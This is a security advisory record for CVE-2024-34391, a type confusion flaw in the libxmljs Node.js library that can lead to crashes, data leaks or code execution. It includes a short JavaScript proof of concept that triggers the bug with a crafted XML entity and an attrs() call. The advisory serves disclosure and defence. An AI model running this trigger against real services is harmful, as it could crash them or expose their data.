{"hash":"6f5fc7b36149126bbb558b9e4512623e7d325cbe","data":{"post":{"title":"libxmljs attrs type confusion RCE","path":"/vulnerabilities/libxmljs-attrs-type-confusion-rce-jfsa-2024-001033988/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>libxmljs attrs type confusion RCE</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>libxmljs</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking a function on the result of attrs() that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled).</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-js\">const libxmljs = require('libxmljs');\n\nvar d = `&#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&#x3C;!DOCTYPE note\n[\n&#x3C;!ENTITY writer \"` +\n 'A'.repeat(0x1234) +\n`\">\n]>\n&#x3C;from>&#x26;writer;&#x3C;/from>\n`;\n\nt = libxmljs.parseXml(d, {flags: [libxmljs.XMLParseFlags.XML_PARSE_HUGE]})\nfrom = t.get('//from')\nc = from.childNodes()[0]\nc2 = c.childNodes()[0]\nc2_attrs = c2.attrs()\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/libxmljs/libxmljs/issues/645\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Original Advisory</a></p>\n","description":"CVE-2024-34391, HIGH, libxmljs attrs type confusion RCE","date_published":"2024-05-02","xray_id":"JFSA-2024-001033988","vul_id":"CVE-2024-34391","severity":"high","discovered_by":"Uriya Yavnieli","last_updated":"2024-05-02","cvss":8.1}},"context":{}}